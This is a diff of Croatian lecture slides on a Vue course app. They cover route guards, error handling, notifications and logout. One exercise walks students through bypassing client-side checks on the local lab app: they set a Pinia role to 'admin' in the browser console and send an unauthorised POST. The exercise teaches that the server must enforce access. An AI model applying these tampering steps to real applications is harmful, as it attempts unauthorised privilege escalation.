-\renewcommand{\arraystretch}{1.25}
-\begin{tabular}{@{}L{2.0cm}L{4.4cm}L{4.9cm}@{}}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{3.0cm}L{2.8cm}L{5.4cm}@{}}
   \toprule
-  \textbf{Kod} & \textbf{Značenje} & \textbf{Tko ga obrađuje} \\
+  \textbf{Ruta} & \textbf{Korisnik} & \textbf{Ishod} \\
   \midrule
-  \texttt{401} & token ne vrijedi ili je istekao & presretač: obnova ili odjava \\
-  \texttt{403} & uloga ili vlasništvo ne dopuštaju & presretač: poruka i povratak \\
+  javna & neprijavljen & otvara se \\
+  obrazac za prijavu & prijavljen & popis natjecanja \\
+  zaštićena & neprijavljen & prijava, s adresom u \texttt{redirect} \\
+  samo za ulogu & druge uloge & popis natjecanja \\
+  zaštićena & prijavljen & otvara se \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.4em}
+Ako funkcija vrati \texttt{true}, navigacija se nastavlja, a ako vrati opis rute, korisnik odlazi na nju. Javne su prijava i stranica za nepoznatu adresu; sve ostalo traži prijavu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Uvjet uz rutu}
+\begin{lstlisting}[language=typescript]
+// src/router/index.ts
+{
+  path: '/natjecatelji',
+  name: 'lifters',
+  component: () => import('@/views/LiftersView.vue'),
+  meta: { title: 'Natjecatelji', role: 'club' },
+},
+{
+  path: '/admin',
+  component: () => import('@/views/admin/AdminLayout.vue'),
+  meta: { role: 'admin' },
+  children: [ ... ],
+},
+\end{lstlisting}
+
+\vspace{0.2em}
+Polje \texttt{meta} nosi proizvoljne podatke o ruti, a Vue Router podatke roditelja spaja s podatcima djeteta. Uvjet za cijelu administraciju piše se jednom, ondje gdje se rute nabrajaju, a provjera ostaje jedna.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Granica zaštite u korisničkom sučelju}
+Provjera prije navigacije sprječava da korisnik otvori prikaz koji mu ne pripada. Ne sprječava ga da pošalje zahtjev:
+
+\vspace{0.5em}
+\begin{itemize}
+  \itemsep0.45em
+  \item zahtjev se može poslati iz konzole preglednika, iz alata ili iz tuđeg programa
+  \item stanje aplikacije u pregledniku korisnik može promijeniti sam
+  \item preuzeti kod aplikacije sadrži sve adrese koje ona poziva
+\end{itemize}
+
+\vspace{0.7em}
+Provjera u pregledniku postoji radi korisnika, a provjera na poslužitelju radi zaštite. \textbf{Podatci koji korisniku ne pripadaju ne izlaze s poslužitelja}, bez obzira na to što korisničko sučelje prikazuje.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Mjesto obrade pogreške}
+\vspace{0.3em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{2.2cm}L{4.4cm}L{4.6cm}@{}}
+  \toprule
+  \textbf{Odgovor} & \textbf{Značenje} & \textbf{Obrađuje ga} \\
+  \midrule
+  \texttt{401} & token ne vrijedi ili je istekao & sloj za zahtjeve: obnova \\
   \texttt{422} & tijelo ne odgovara shemi & prikaz: poruka uz polje \\
-  \texttt{409} & radnja je u sukobu sa stanjem & prikaz: poruka iznad obrasca \\
+  \texttt{400}, \texttt{409} & pravilo ili sukob sa zapisom & prikaz: poruka uz obrazac \\
+  ostali & zabrana, nema zapisa, kvar & jedno mjesto: obavijest \\
   \bottomrule
 \end{tabular}
 }
 \end{center}
 
 \vspace{0.6em}
-Prva dva odgovora svugdje znače isto, pa se obrađuju na jednom mjestu. Druga dva ovise o tome koji je obrazac poslan, pa ih obrađuje prikaz koji ga je poslao.
-
-\vspace{0.4em}
-Odgovor nosi i polje \texttt{code}, koje je stalno. Sučelje grana obradu po njemu.
+Odgovori \texttt{422}, \texttt{400} i \texttt{409} imaju smisla samo uz obrazac koji ih je izazvao, pa ih hvata prikaz koji ga je poslao, po polju \texttt{code}. Svi ostali znače isto na svakom prikazu i idu na jedno mjesto; bez njega bi iznimka prekinula prikaz, a korisnik ne bi znao zašto.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Pogreška u samom prikazu}
-Presretač hvata pogreške koje stignu kao odgovor. Iznimka u kodu komponente ne prolazi kroz njega: prikaz se prekine i korisnik ostane pred praznim zaslonom.
-
+\begin{frame}[fragile]{Obrada ostalih pogrešaka}
 \begin{lstlisting}[language=typescript]
-// main.ts
-app.config.errorHandler = (err, instance, info) => {
-  console.error(err, info)
+// src/main.ts
+function reportError(error: unknown) {
+  if (error instanceof ApiError) {
+    notifications.error(error.message)
+    return
+  }
+  console.error(error)
+  notifications.error(<@'Dogodila se neočekivana pogreška. ...'@>)
 }
+app.config.errorHandler = (error) => reportError(error)
+window.addEventListener('unhandledrejection', (event) => {
+  event.preventDefault()
+  reportError(event.reason)
+})
+\end{lstlisting}
+
+\vspace{0.1em}
+\texttt{errorHandler} hvata iznimke iz komponenata i rukovatelja događajima, a \texttt{unhandledrejection} obećanje koje nitko ne čeka.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Obavijesti}
+\begin{lstlisting}[language=html]
+<!-- src/components/NotificationList.vue -->
+<div class="notices" aria-live="polite">
+  <div v-for="n in notifications.items" :key="n.id"
+       class="notice" :class="n.kind">
+    <span>{{ n.text }}</span>
+    ...  <!-- gumb za zatvaranje -->
+  </div>
+</div>
 \end{lstlisting}
 
 \vspace{0.4em}
-Rukovatelj hvata neuhvaćene iznimke iz komponenata, izvedenih vrijednosti i promatrača. Isto mjesto služi i za poruku korisniku umjesto praznog zaslona.
+Obavijest se pojavljuje bez pomicanja fokusa. Atribut \texttt{aria-live} čitaču zaslona javlja da pročita novi sadržaj tog dijela stranice; bez njega bi korisnik čitača zaslona pogrešku propustio.
 
 \vspace{0.4em}
-Uloga mu odgovara onoj koju na poslužitelju ima rukovatelj koji iznimku prevodi u odgovor.
+Ista poruka dvaput zaredom prikazuje se jednom (\codefile{stores/notifications.ts}), pa prekid veze koji obori nekoliko zahtjeva daje jednu obavijest.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Vježba: zaobilaženje zaštite sučelja}
-Prijavite se kao klub \texttt{behemot@plreg.hr}. Administratorski prikaz vama nije dostupan.
+\begin{frame}[fragile]{Odjava}
+\begin{lstlisting}[language=typescript]
+// src/components/AppNav.vue
+function logout() {
+  auth.forget()
+  window.location.assign('/prijava')
+}
+\end{lstlisting}
 
-\vspace{0.8em}
+\vspace{0.5em}
+Pohrane u memoriji drže sve što je prijavljeni korisnik dohvatio. Sljedeći korisnik iste kartice to ne smije vidjeti.
+
+\vspace{0.5em}
+Odjava zato aplikaciju učitava ispočetka. Novo učitavanje prazni sve pohrane odjednom, i one koje u projekt tek dođu, pa odjava ne treba popis svega što treba zaboraviti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Vježba: zaobilaženje korisničkog sučelja}
+Prijavljeni ste kao klub \texttt{behemot@plreg.hr}. U konzoli je pripremljeno:
+
+\begin{lstlisting}[language=typescript]
+const { request } = await import('/src/api/http.ts')
+const club = { name: 'Test klub', city: 'Zadar',
+  username: 'test@plreg.hr', password: '<barem 8 znakova>' }
+const create = () => request('POST', '/clubs/', { body: club })
+const pinia = document.querySelector('#app').__vue_app__
+  .config.globalProperties.$pinia
+\end{lstlisting}
+
 \begin{enumerate}
-  \itemsep0.4em
-  \item Upišite adresu administratorskog prikaza izravno u traku preglednika.
-  \item U konzoli pošaljite \texttt{POST /clubs} s ispravnim tijelom i svojim tokenom.
-  \item Dohvatite popis natjecatelja drugoga kluba, s oznakom koja nije vaša.
-  \item U pohrani preglednika pronađite zapis koji sučelje čita i promijenite ga tako da sučelje misli da ste organizator.
+  \itemsep0.1em
+  \item U adresnu traku upišite \texttt{http://127.0.0.1:5173/admin/klubovi}.
+  \item Pošaljite \texttt{await create().catch((e) => e)}.
+  \item Pošaljite \texttt{pinia.state.value.auth.user.role = 'admin'}.
+  \item Pogledajte navigaciju i otvorite Administracija.
   \item Ponovite drugi korak.
 \end{enumerate}
 
-\vspace{0.8em}
-Koji ste status dobili u drugom koraku, a koji nakon četvrtoga, i što se u aplikaciji promijenilo?
+\vspace{0.1em}
+Što se nakon trećeg koraka promijenilo u korisničkom sučelju, a što u odgovoru u petom?
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Sažetak}
 \begin{itemize}
-  \itemsep0.3em
-  \item Odgovor s drugog izvora preglednik daje skripti samo uz dopuštenje poslužitelja.
-  \item Dopuštenje se zapisuje na poslužitelju i navodi izvore izrijekom.
-  \item Zahtjev sa zaglavljem ili tijelom dobiva predzahtjev metodom \texttt{OPTIONS}.
-  \item Adresa, zaglavlja i obrada statusa opisuju se jednom, u zajedničkom klijentu.
-  \item Prijava vraća kratkotrajni token za zahtjeve i dugotrajni za obnovu.
-  \item Obje pohrane u pregledniku skripta čita; razlika je koliko dugo.
-  \item Token dodaje presretač zahtjeva, a obnavlja ga presretač odgovora.
-  \item Osvježavanje prazni memoriju, pa se korisnik dohvaća pri pokretanju.
-  \item Provjera prije navigacije postoji radi korisnika, a ne kao zaštita.
-  \item \texttt{401} i \texttt{403} idu na jedno mjesto, \texttt{422} i \texttt{409} u prikaz.
+  \itemsep0.05em
+  \item Odgovor s drugog izvora skripta dobiva samo uz dopuštenje poslužitelja.
+  \item Uz posrednika na izvoru stranice dopuštenje za drugi izvor nije potrebno.
+  \item \texttt{fetch} ne odbija odgovor s pogreškom, pa status provjerava sloj za zahtjeve.
+  \item Neuspio zahtjev postaje pogreška sa statusom, stalnim kodom i porukom.
+  \item Token u \texttt{localStorage} preživi osvježavanje, ali ga čita svaka skripta.
+  \item Na \texttt{401} sloj jednom obnavlja token, a istodobni zahtjevi čekaju istu obnovu.
+  \item Provjera prije navigacije služi korisniku, a podatke štiti poslužitelj.
+  \item Pogreške uz obrazac obrađuje prikaz, a sve ostale jedno mjesto u \codefile{main.ts}.
+  \item Odjava ponovno učitava aplikaciju, pa nestaje sve što je korisnik dohvatio.
 \end{itemize}
 \end{frame}
 
